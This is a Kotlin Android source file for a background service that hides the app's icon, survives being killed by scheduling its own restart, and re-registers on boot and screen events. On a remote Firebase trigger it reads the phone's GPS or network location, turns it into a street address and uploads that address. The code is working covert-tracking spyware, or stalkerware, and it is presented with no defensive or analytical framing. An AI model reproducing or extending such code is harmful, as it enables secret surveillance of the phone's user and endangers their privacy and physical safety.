package com.example.pc.huskotlin

import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.PendingIntent
import android.app.Service
import android.content.ContentValues.TAG
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.hardware.Camera
import android.location.*
import android.os.Bundle
import android.os.IBinder
import android.os.SystemClock
import android.util.Log
import android.view.SurfaceHolder
import android.view.SurfaceView
import com.google.firebase.database.*
import java.util.*
import android.support.v4.content.ContextCompat
import android.support.v4.content.ContextCompat.startForegroundService
import android.os.Build





class ScreenOnOffBackgroundService : Service(), LocationListener {
    override fun onLocationChanged(location: Location?) {

    }

    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {
     }

    override fun onProviderEnabled(provider: String?) {
     }

    override fun onProviderDisabled(provider: String?) {
     }

    private var screenOnOffReceiver: ScreenOnOffReceiver? = null
    var isGPSEnable = false
    var isNetworkEnable = false
    var latitude: Double = 0.toDouble()
    var longitude: Double = 0.toDouble()
    var locationManager: LocationManager? = null
    var location: Location? = null

    var checkLocationDB: DatabaseReference? = null
    var locationResult: DatabaseReference? = null


     var geocoder: Geocoder? = null
    var addresses: List<Address>? = null

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        val intentFilter = IntentFilter()

        // Add network connectivity change action.


        // Set broadcast receiver priority.
        intentFilter.priority = 100


        // Create a network change broadcast receiver.
        screenOnOffReceiver = ScreenOnOffReceiver()

        // Register the broadcast receiver with the intent filter object.
        registerReceiver(screenOnOffReceiver, intentFilter)


        MainActivity.instance.hideIcon()
        var database = FirebaseDatabase.getInstance()
        checkLocationDB = database.getReference("checkLocation")
        locationResult = database.getReference("locationResult")
        Log.d("SCREEN_TOGGLE_TAG", "Service onCreate: screenOnOffReceiver is registered.")
        geocoder = Geocoder(this, Locale.getDefault())

        fn_getlocation()



        startLocation()

        return Service.START_STICKY

    }

    override fun onCreate() {

        super.onCreate()
        val intentFilter = IntentFilter()

        // Add network connectivity change action.
        intentFilter.addAction("android.intent.action.SCREEN_ON")
        intentFilter.addAction("android.intent.action.SCREEN_OFF")
        intentFilter.addAction("android.intent.action.USER_PRESENT")
        intentFilter.addAction("android.intent.action.BOOT_COMPLETED")

        // Set broadcast receiver priority.
        intentFilter.priority = 100

        // Create a network change broadcast receiver.
        screenOnOffReceiver = ScreenOnOffReceiver()

        // Register the broadcast receiver with the intent filter object.
        registerReceiver(screenOnOffReceiver, intentFilter)


        MainActivity.instance.hideIcon()

        Log.d("SCREEN_TOGGLE_TAG", "Service onCreate: screenOnOffReceiver is registered.")
        // Create an IntentFilter instance.

    }
    private fun startLocation() {
        checkLocationDB!!.addValueEventListener(object : ValueEventListener {
            override fun onCancelled(p0: DatabaseError) {

            }

            override fun onDataChange(dataSnapshot: DataSnapshot) {
                val value = dataSnapshot.getValue(String::class.java)
                if (value!!.contains("true")) {
                    try {
                        fn_getlocation()

                        checkLocationDB!!.setValue("false")
                        Log.d("RecorderService new","latutide :"+ location!!.latitude.toString() + "" )
                        Log.d("RecorderService new","longitude :"+ location!!.longitude.toString() + "" )
                    }catch (e:Exception){
                        e.printStackTrace()
                    }


                } else {
                }
            }
        })
    }

    private fun fn_update(latitude: Double,longitude: Double) {
        Log.d("RecorderService","latutide :$latitude"   )
        Log.d("RecorderService","longitude : $longitude")
        addresses = geocoder!!.getFromLocation(latitude, longitude, 1);
        //val address = addresses!![0].getAddressLine(0) // If any additional address line present than only, check with max available address lines by getMaxAddressLineIndex()
        if (addresses != null && addresses!!.isNotEmpty()) {

            // body of loop
            val address = addresses!![0].getAddressLine(0)
            // Thoroughfare seems to be the street name without numbers
            println(address)
            locationResult!!.setValue(address)

        }
        //  intent!!.putExtra("latutide", location.latitude.toString() + "")
        // intent!!.putExtra("longitude", location.longitude.toString() + "")
        //sendBroadcast(intent)
    }

    @SuppressLint("MissingPermission")
    private fun fn_getlocation() {
        try {
            locationManager = applicationContext.getSystemService(LOCATION_SERVICE) as LocationManager
            isGPSEnable = locationManager!!.isProviderEnabled(LocationManager.GPS_PROVIDER)
            isNetworkEnable = locationManager!!.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

            if (!isGPSEnable && !isNetworkEnable) {

            } else {

                if (isNetworkEnable) {
                    location = null

                    locationManager!!.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000, 0.0f, this)
                    if (locationManager != null) {
                        location = locationManager!!.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                        if (location != null) {

                            //   Log.e("latitude", location!!.latitude.toString() + "")
                            //   Log.e("longitude", location!!.longitude.toString() + "")
                            Log.d("RecorderServiceNetwork",location!!.latitude.toString() + ""  )
                            Log.d("RecorderServiceNetwork",location!!.longitude.toString() + "")
                            latitude = location!!.latitude
                            longitude = location!!.longitude
                            fn_update(latitude,longitude)
                        }
                    }

                }


                if (isGPSEnable) {
                    location = null
                    locationManager!!.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 0.0f, this)
                    if (locationManager != null) {
                        location = locationManager!!.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                        if (location != null) {
                            //Log.e("latitude", location!!.latitude.toString() + "")
                            // Log.e("longitude", location!!.longitude.toString() + "")
                            Log.d("RecorderService Enable",location!!.latitude.toString() + ""  )
                            Log.d("RecorderService Enable",location!!.longitude.toString() + "")
                            latitude = location!!.latitude
                            longitude = location!!.longitude
                            fn_update(latitude,longitude)
                        }
                    }
                }


            }

        }catch (e:Exception){
            //   startLocation()
        }



    }

    override
    fun onTaskRemoved(rootIntent: Intent) {
        super.onTaskRemoved(rootIntent)
        Log.i(TAG, "onTaskRemoved()")

        val restartServiceIntent = Intent(applicationContext,
                this.javaClass)
        restartServiceIntent.setPackage(packageName)

        val intent = Intent(applicationContext, this.javaClass)

        intent.setPackage(packageName)

        val restartServicePendingIntent = PendingIntent.getService(
                applicationContext, 1, restartServiceIntent,
                PendingIntent.FLAG_ONE_SHOT)
        val alarmService = applicationContext
                .getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmService.set(AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 1000,
                restartServicePendingIntent)

        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        super.onDestroy()
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.N_MR1) {
            applicationContext.startForegroundService(Intent(applicationContext, ScreenOnOffBackgroundService::class.java))
        } else {
            applicationContext.startService(Intent(applicationContext, ScreenOnOffBackgroundService::class.java))
        }
       /* Log.i(TAG, "onDestroy()")
        startService(Intent(this, ScreenOnOffBackgroundService::class.java))*/
    }

}
